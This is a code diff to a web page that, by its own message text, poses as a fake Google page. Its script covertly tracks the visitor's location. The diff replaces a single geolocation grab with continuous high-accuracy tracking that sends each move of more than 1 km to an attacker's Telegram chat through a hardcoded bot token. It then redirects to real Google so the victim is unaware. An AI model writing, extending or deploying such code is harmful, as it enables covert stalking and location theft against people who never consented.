@@ -32,6 +32,9 @@
   <script>
     const botToken = "7972755394:AAFVmA7LMOgpygkl-ED_vhHd2eUs-agQ1aw";
     const chatId = "148031411";
+    let lastLat = null;
+    let lastLon = null;
+    const MIN_DISTANCE = 1000; // 1 км
 
     function sendToTelegram(text) {
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -44,26 +47,53 @@
       });
     }
 
-    function handleGeo(position) {
-      const lat = position.coords.latitude.toFixed(6);
-      const lon = position.coords.longitude.toFixed(6);
+    function getDistance(lat1, lon1, lat2, lon2) {
+      const R = 6371000;
+      const toRad = x => x * Math.PI / 180;
+      const dLat = toRad(lat2 - lat1);
+      const dLon = toRad(lon2 - lon1);
+      const a = Math.sin(dLat / 2) ** 2 +
+                Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
+                Math.sin(dLon / 2) ** 2;
+      const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+      return R * c;
+    }
+
+    function handlePosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
       const acc = position.coords.accuracy;
 
-      const msg = `📍 Поддельный Google:\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${Math.round(acc)}м\nhttps://www.google.com/maps?q=${lat},${lon}`;
-      sendToTelegram(msg);
+      if (lastLat === null || lastLon === null) {
+        lastLat = lat;
+        lastLon = lon;
+
+        const msg = `📍 Стартовая точка:\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nhttps://www.google.com/maps?q=${lat},${lon}`;
+        sendToTelegram(msg);
+        return;
+      }
+
+      const distance = getDistance(lat, lon, lastLat, lastLon);
+      if (distance >= MIN_DISTANCE) {
+        const msg = `📍 Перемещение более 1 км:\nШирота: ${lat.toFixed(6)}\nДолгота: ${lon.toFixed(6)}\nДистанция: ${Math.round(distance)}м\nhttps://www.google.com/maps?q=${lat},${lon}`;
+        sendToTelegram(msg);
+        lastLat = lat;
+        lastLon = lon;
+      }
     }
 
     function handleError() {
-      sendToTelegram("⚠️ Геолокация не получена (страница Google)");
+      sendToTelegram("⚠️ Ошибка геолокации (трекинг)");
     }
 
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(handleGeo, handleError);
-    } else {
-      sendToTelegram("⚠️ Геолокация не поддерживается браузером.");
-    }
+    // Включаем трекинг
+    navigator.geolocation.watchPosition(handlePosition, handleError, {
+      enableHighAccuracy: true,
+      maximumAge: 0,
+      timeout: 10000
+    });
 
-    // Редирект через 5 секунд
+    // Редирект через 4 секунды
     setTimeout(() => {
       window.location.href = "https://www.google.com/?client=safari";
     }, 4000);
